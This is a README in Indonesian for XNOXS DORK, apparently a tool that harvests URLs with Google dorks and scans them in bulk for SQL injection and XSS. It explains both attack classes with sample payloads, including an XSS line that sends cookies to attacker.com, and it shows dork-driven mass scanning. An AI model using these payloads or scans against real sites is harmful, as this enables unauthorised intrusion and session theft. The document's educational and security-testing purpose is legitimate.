# XNOXS DORK

SQLi & XSS Vulnerability Scanner v3.0 [Multi-threaded]

## Deskripsi

XNOXS DORK adalah tool keamanan untuk mendeteksi kerentanan SQL Injection dan XSS (Cross-Site Scripting) pada website. Tool ini menggunakan Google Dork untuk mencari target URL dan melakukan scanning secara otomatis dengan multi-threading.

**For Security Research Purposes Only**

---

## Apa itu SQL Injection (SQLi)?

### Definisi
SQL Injection adalah teknik serangan yang memanfaatkan celah keamanan pada aplikasi web yang tidak memvalidasi input pengguna dengan benar. Penyerang menyisipkan kode SQL berbahaya ke dalam query database melalui input form, URL parameter, atau cookie.

### Cara Kerja
1. Aplikasi web menerima input dari pengguna (contoh: `id=1`)
2. Input tersebut langsung dimasukkan ke dalam query SQL tanpa validasi
3. Penyerang memodifikasi input dengan kode SQL (contoh: `id=1' OR '1'='1`)
4. Database mengeksekusi query yang sudah dimodifikasi
5. Penyerang mendapatkan akses ke data yang seharusnya tidak bisa diakses

### Jenis SQL Injection

#### Error-based SQLi
Memanfaatkan pesan error database yang ditampilkan untuk mengekstrak informasi.
```
https://example.com/product.php?id=1'
```

#### Blind SQL Injection (Boolean-based)
Tidak menampilkan error, tapi response berbeda berdasarkan true/false condition.
```
https://example.com/product.php?id=1' AND '1'='1  (response normal)
https://example.com/product.php?id=1' AND '1'='2  (response berbeda)
```

#### Time-based Blind SQLi
Menggunakan delay untuk mendeteksi vulnerability.
```
https://example.com/product.php?id=1' AND SLEEP(5)--
```

### Dampak SQL Injection
- **Data Breach** - Pencurian data sensitif (username, password, data pribadi, kartu kredit)
- **Authentication Bypass** - Login tanpa password yang valid
- **Data Manipulation** - Mengubah atau menghapus data di database
- **Remote Code Execution** - Mengeksekusi perintah sistem pada server
- **Full Server Takeover** - Mengambil alih kontrol penuh server database

---

## Apa itu Cross-Site Scripting (XSS)?

### Definisi
XSS adalah kerentanan keamanan yang memungkinkan penyerang menyuntikkan script berbahaya (biasanya JavaScript) ke halaman web yang dilihat oleh pengguna lain. Script tersebut dieksekusi di browser korban dengan konteks keamanan website yang rentan.

---

## Reflected XSS

### Cara Kerja
1. Penyerang membuat URL berbahaya yang berisi script
2. Korban mengklik URL tersebut (biasanya melalui phishing)
3. Server merefleksikan script ke halaman response
4. Browser korban mengeksekusi script berbahaya
5. Script mencuri cookie, session, atau data sensitif lainnya

### Contoh Serangan
```
URL Normal:
https://example.com/search?q=laptop

URL dengan Reflected XSS:
https://example.com/search?q=<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```

### Dampak Reflected XSS
- **Session Hijacking** - Mencuri session cookie untuk mengambil alih akun
- **Credential Theft** - Membuat form login palsu untuk mencuri password
- **Keylogging** - Merekam semua keystroke korban
- **Phishing** - Menampilkan konten palsu yang terlihat asli
- **Malware Distribution** - Mengarahkan korban ke situs berbahaya

---

## DOM-based XSS

### Definisi
DOM XSS adalah varian XSS dimana payload berbahaya dieksekusi sebagai hasil dari modifikasi DOM (Document Object Model) di browser korban. Berbeda dengan Reflected XSS, serangan ini terjadi sepenuhnya di sisi client tanpa melibatkan server.

### Cara Kerja
1. Halaman web menggunakan JavaScript untuk membaca data dari URL (source)
2. Data tersebut ditulis ke halaman tanpa sanitasi (sink)
3. Penyerang memanipulasi URL dengan payload berbahaya
4. JavaScript di halaman mengeksekusi payload tersebut
5. Serangan terjadi tanpa request ke server

### Sources (Sumber Data Berbahaya)
```javascript
document.URL
document.location
document.referrer
window.name
location.hash
location.search
localStorage
sessionStorage
```

### Sinks (Titik Eksekusi Berbahaya)
```javascript
eval()
innerHTML
outerHTML
document.write()
setTimeout()
setInterval()
element.src
element.href
jQuery.html()
```

### Dampak DOM XSS
- **Sama dengan Reflected XSS** - Session hijacking, credential theft, dll
- **Sulit Dideteksi** - Tidak ada jejak di server logs
- **Bypass WAF** - Web Application Firewall tidak bisa mendeteksi
- **Persistent dalam SPA** - Bisa bertahan di Single Page Applications

---

## Perbandingan Jenis XSS

| Aspek | Reflected XSS | DOM-based XSS |
|-------|---------------|---------------|
| Lokasi Eksekusi | Server → Client | Client Only |
| Server Logs | Ada jejak | Tidak ada jejak |
| Deteksi WAF | Bisa dideteksi | Sulit dideteksi |
| Payload di Response | Ya | Tidak |
| Memerlukan JavaScript | Tidak selalu | Ya |

---

## Fitur Tool

- **Google Dork Scanner** - Mencari target URL menggunakan Google Dork dengan pagination (hingga 100+ URL)
- **SQL Injection Detection** - Mendeteksi kerentanan SQLi (Error-based & Blind)
- **Blind SQLi Detection** - Boolean-based dan Time-based blind injection
- **Reflected XSS Detection** - Mendeteksi kerentanan Reflected XSS dengan berbagai payload
- **DOM-based XSS Detection** - Analisis source & sink untuk mendeteksi DOM XSS
- **Multi-threaded Scanning** - Scanning paralel untuk performa lebih cepat
- **Import URL dari File** - Scan batch URL dari file txt
- **Export Hasil** - Export ke JSON, CSV, atau HTML Report
- **CLI Mode** - Jalankan dari command line dengan arguments
- **ScraperAPI Integration** - Bypass Google captcha untuk hasil pencarian yang lebih andal

---

## Instalasi

### 1. Clone Repository

```bash
git clone https://github.com/developerxnoxs/xnoxs-dork.git
cd xnoxs-dork
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

---

## Penggunaan

### Interactive Mode

```bash
python xnoxs_dork.py
```

### Menu Utama

```
[1] Scan dengan Google Dork (Multi-threaded)
[2] Scan URL Tunggal
[3] Scan URL dari File
[4] Lihat Hasil Vulnerability
[5] Export Hasil
[6] Pengaturan
[7] Tentang Tool
[0] Keluar
```

### CLI Mode

```bash
# Scan single URL
python xnoxs_dork.py -u "http://example.com/page.php?id=1"

# Scan dari file
python xnoxs_dork.py -f urls.txt

# Scan dengan Google Dork
python xnoxs_dork.py -d "inurl:php?id="

# Dengan output file
python xnoxs_dork.py -u "http://example.com/?id=1" -o results.json

# Custom threads dan timeout
python xnoxs_dork.py -f urls.txt -t 10 --timeout 15

# Lihat bantuan
python xnoxs_dork.py --help
```

### CLI Arguments

| Argument | Deskripsi |
|----------|-----------|
| `-u, --url` | Single URL untuk scan |
| `-f, --file` | File berisi daftar URL |
| `-d, --dork` | Google dork query |
| `-o, --output` | Output file (json/csv/html) |
| `-t, --threads` | Jumlah thread (default: 5) |
| `--timeout` | Request timeout dalam detik (default: 10) |
| `-r, --results` | Max hasil dari dork (default: 100) |

### Contoh Google Dork

```
inurl:php?id=
inurl:product.php?id=
site:example.com inurl:?id=
inurl:index.php?page=
inurl:article.php?id=
inurl:news.php?id=
inurl:item.php?id=
```

### Format File URL

```
# Contoh urls.txt
http://example1.com/page.php?id=1
http://example2.com/product.php?cat=5
https://example3.com/news.php?id=10
# Baris dengan # akan diabaikan
```

---

## Export Hasil

Tool ini mendukung export hasil ke 3 format:

### JSON
```json
{
  "scan_date": "2024-01-15T10:30:00",
  "total_vulnerabilities": {
    "sqli": 5,
    "blind_sqli": 2,
    "xss": 3,
    "dom_xss": 1
  },
  "sql_injection": [...],
  "reflected_xss": [...],
  "dom_xss": [...]
}
```

### CSV
Format tabel dengan kolom: Type, URL, Parameter, Details, Severity

### HTML Report
Report visual dengan styling modern, mudah dibaca dan di-share.

---

## Pengaturan

| Setting | Default | Deskripsi |
|---------|---------|-----------|
| Threads | 5 | Jumlah thread untuk scanning paralel |
| Timeout | 10s | Timeout request dalam detik |
| Results | 100 | Jumlah maksimal URL dari Google Dork |

---

## Database yang Didukung

Tool ini dapat mendeteksi error SQL Injection dari berbagai database:

- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- IBM DB2
- Generic SQL Errors

---

## Disclaimer

**PERINGATAN PENTING**

Tool ini dibuat HANYA untuk tujuan edukasi dan penelitian keamanan yang sah. 

- Jangan gunakan tool ini pada sistem tanpa izin tertulis dari pemilik
- Penggunaan ilegal adalah tanggung jawab pengguna sepenuhnya
- Pastikan Anda memahami hukum cyber crime di negara Anda
- Selalu lakukan pengujian pada lingkungan yang Anda miliki atau memiliki izin

---

## Requirements

- Python 3.9+
- colorama
- requests
- xnoxs-engine

---

## Changelog

### v3.0
- Tambah Blind SQL Injection detection (Boolean-based)
- Tambah Time-based SQL Injection detection
- Tambah fitur Import URL dari file
- Tambah fitur Export ke JSON/CSV/HTML
- Tambah CLI mode dengan arguments
- Update menu dan UI

### v2.2
- Multi-threaded scanning
- DOM-based XSS detection
- ScraperAPI integration

---

## Lisensi

MIT License

## Author

XNOXS Team - github.com/developerxnoxs
